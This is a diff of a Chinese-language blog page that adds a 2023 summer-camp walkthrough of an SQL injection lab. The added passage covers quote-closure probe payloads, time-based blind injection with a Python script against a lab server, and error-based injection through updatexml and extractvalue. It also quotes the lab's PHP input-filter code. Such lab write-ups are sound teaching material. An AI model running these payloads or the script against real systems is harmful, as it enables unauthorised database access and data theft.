@@ -55,8 +55,18 @@
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130832052.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130852364.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130941926.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230715155500241.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230715155607903.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716210307686.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716210541431.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716211039043.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716211543520.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716212625454.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716213520875.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716214135001.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716214432222.png">
 <meta property="article:published_time" content="2023-02-09T08:30:35.000Z">
-<meta property="article:modified_time" content="2023-04-30T08:53:52.314Z">
+<meta property="article:modified_time" content="2023-07-16T14:24:44.233Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="sqli">
@@ -273,7 +283,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18k words
+          21k words
         
       </span>
     
@@ -284,7 +294,7 @@
         
         
         
-          152 mins
+          176 mins
         
       </span>
     
@@ -556,6 +566,42 @@
 <p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p>
 <p><img src="/2023/02/09/SQLI/image-20230412130941926.png" srcset="/img/loading.gif" lazyload></p>
 <p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p>
+<hr>
+<h2 id="2023ROIS夏令营"><a href="#2023ROIS夏令营" class="headerlink" title="2023ROIS夏令营"></a>2023ROIS夏令营</h2><h3 id="sqli靶场"><a href="#sqli靶场" class="headerlink" title="sqli靶场"></a>sqli靶场</h3><p>先试单双引号，有报错说明原结构被破坏，则为该引号闭合，都没反应，可能是数字型。再加注释符(–、–+、#都有可能，注意浏览器中从表单提交可能被url编码，可以从hackbar或者bp提交表单)，如果还是报错，则可能存在括号闭合，加括号报错消失之后试下两个语句，<code>or 1=1，or 1=0</code>以及<code>order by ...</code>后者查列数，前者如果结果有所不同则存在布尔注入利用，之后可尝试联合注入、布尔盲注，如果页面始终都没发生变化，则试下时间注入。不存在报错将所有可能情况都试下(<code>&#39; or 1=1/0#</code>、<code>&quot; or 1=1/0#</code>、<code>&quot;) or 1=1/0#</code>、<code>&#39;) or 1=1/0#</code>、<code>&#39;)) or 1=1/0#</code>、<code>&quot;)) or 1=1/0#</code>、)</p>
+<p>常见闭合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 、">&#x27;、 &quot;、&#x27;)、&quot;)、&#x27;))、&quot;))<br></code></pre></td></tr></table></figure>
+
+<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>发现不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用。布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if()</code>函数和<code>sleep()</code>函数。<code>if(a,sleep(10),1)</code>如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。<br><img src="/2023/02/09/SQLI/image-20230715155500241.png" srcset="/img/loading.gif" lazyload>(%3C和%3E是<code>&lt;&gt;</code>，被编码了hhh)<img src="/2023/02/09/SQLI/image-20230715155607903.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到如果判断长度不为8，刷的一下就加载完了，但是如果数据库名长度等于八就延迟十秒</p>
+<p>后面的操作就类似了</p>
+<p>在利用python编写脚本的时候要利用到time模块：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:3456/Less-9/&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqli</span>():<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>        start_time = time.time()<br>        payload = <span class="hljs-string">f&quot;&quot;&quot;?id=1&#x27; and if(length(database())=<span class="hljs-subst">&#123;i&#125;</span>,sleep(2),1)--+&quot;&quot;&quot;</span><br>        r = requests.get(url+payload)<br>        end_time = time.time()<br>        exec_time = end_time - start_time<br>        <span class="hljs-keyword">if</span> exec_time&gt;<span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">break</span><br><br>sqli()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><p>报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(target_xml,xpath_string,new_value)<br>#target_xml:需要更新的xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要更新的节点或属性<br>#new_value:新的值， 用于替换目标节点或属性的值<br>#示例：<br>update your_table set xml_culumn = updatexml(xml_column,&#x27;/root/user[1]/name&#x27;,&#x27;Potatowo&#x27;) where id = 1;<br>#上述示例中your_table是要更新的表，xml_column是包含xml数据的列名,/root/user[1]/name是xpath表达式，指定要更新的节点路径，&#x27;Potatowo&#x27;是设置的新的值<br><br>extractvalue(xml_data,xpath_string)<br>#xml_data：xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要提取的节点<br>#函数根据提供的xpath表达式在xml数据中查找匹配的节点，并返回该节点的文本值<br><br>#一个有效的xpath表达式应该满足以下要求：<br>#以节点测试、函数、运算符或路径表达式开头<br>#路径表达式应以节点轴或节点名称开始<br><br>#若不满足xpath语法，则会报错，如果xpath为sql语句，mysql会执行，并将执行结果返回在报错中<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/09/SQLI/image-20230716210307686.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试注入点的时候发现无论如何都没有反应，都只出现上图的情况，当用户名为’admin’或’Dumb’时密码输入什么都行，懵逼了挺久的，然后看了眼这个<img src="/2023/02/09/SQLI/image-20230716210541431.png" srcset="/img/loading.gif" lazyload></p>
+<p>啊原来是修改密码啊。。。真tm</p>
+<p>既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合，随手试了下，</p>
+<p><img src="/2023/02/09/SQLI/image-20230716211039043.png" srcset="/img/loading.gif" lazyload></p>
+<p>，当然此处的用户名必须是admin或者Dumb，到最后一步查表内容时出问题了</p>
+<p><img src="/2023/02/09/SQLI/image-20230716211543520.png" srcset="/img/loading.gif" lazyload></p>
+<p>看了眼大佬博客了解到mysql修改和查询不能是同一张表，因此可以引入一个临时表(详情去看<a target="_blank" rel="noopener" href="https://potatowo233.github.io/2023/07/09/ROIS-Summer/">另一篇博客</a>)，然后又踩坑(不过还好，报错的意思就是说临时表必须起别名，问题不大</p>
+<p><img src="/2023/02/09/SQLI/image-20230716212625454.png" srcset="/img/loading.gif" lazyload></p>
+<p>一开始还在纳闷怎么没有admin，观察后发现好像输出字数被限制了，如果想尽可能完整获取数据库中的信息，可以用<code>not in</code>运算符把以及显示出来的用户名排除掉</p>
+<p><img src="/2023/02/09/SQLI/image-20230716213520875.png" srcset="/img/loading.gif" lazyload></p>
+<p>如下，查出来的满满都是admin（，看来懵逼时瞎尝试的次数不少（</p>
+<p><img src="/2023/02/09/SQLI/image-20230716214135001.png" srcset="/img/loading.gif" lazyload></p>
+<p>换成updatexml()函数试下，注意新加入的’*****‘参数</p>
+<p><img src="/2023/02/09/SQLI/image-20230716214432222.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>想了一下，之前能够回显错误信息的不是都可以用报错注入吗？(脑袋发光)，好像比盲注效率高了不少</strong></p>
+<p>这道题看大佬博客好像都审计了一眼源代码，于是跟着学习了下，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>		&#123;<br>		<span class="hljs-comment">// truncation (see comments)</span><br>		<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>		&#125;<br><br>		<span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>			&#123;<br>			<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>			&#125;<br><br>		<span class="hljs-comment">// Quote if not a number</span><br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_digit</span>(<span class="hljs-variable">$value</span>))<br>			&#123;<br>			<span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>			&#125;<br>		<br>	<span class="hljs-keyword">else</span><br>		&#123;<br>		<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$value</span>);<br>		&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>	&#123;<br>	<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中<code>get_magic_quotes_gpc()</code>函数的作用是判断<code>get_magic_quotes_gpc()</code>是否开启，如果开启的话会给用户传入的信息添加上转义字符’\‘，，<code>stringslashes()</code>则是去掉转义字符，这个方法在新版本的php中已经被废弃了，也盲学一下，增长见识。</p>
 
                 
               </div>
